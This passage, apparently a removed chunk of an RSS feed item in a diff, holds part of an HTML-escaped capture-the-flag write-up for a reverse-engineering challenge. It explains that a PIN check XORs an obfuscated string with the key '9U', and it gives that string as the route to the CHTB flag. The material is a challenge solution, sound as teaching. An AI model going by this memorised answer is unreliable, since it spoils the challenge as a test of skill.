-else {
-    Access denied
-}
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;In the check pin function, the odd string we noticed earlier is XOR&amp;rsquo;d with the key of &lt;code&gt;9U&lt;/code&gt; and the value is compared with the pin provided by the user.&lt;/p&gt;
-&lt;p&gt;&lt;img  src=&#34;http://nightwolf56.github.io/img/ca-authenticator-checkpin.png&#34;
-        alt/&gt;&lt;/p&gt;
-&lt;p&gt;XOR &lt;code&gt;}a:Vh|}a:g}8j=}89gV&amp;lt;p&amp;lt;}:dV8&amp;lt;Vg9}V&amp;lt;9V&amp;lt;:j|{:&lt;/code&gt; with &lt;code&gt;9U&lt;/code&gt; and the result is the value of the flag once it is wrapped in the flag format CHTB{}.&lt;/p&gt;
 </description>
     </item>
     
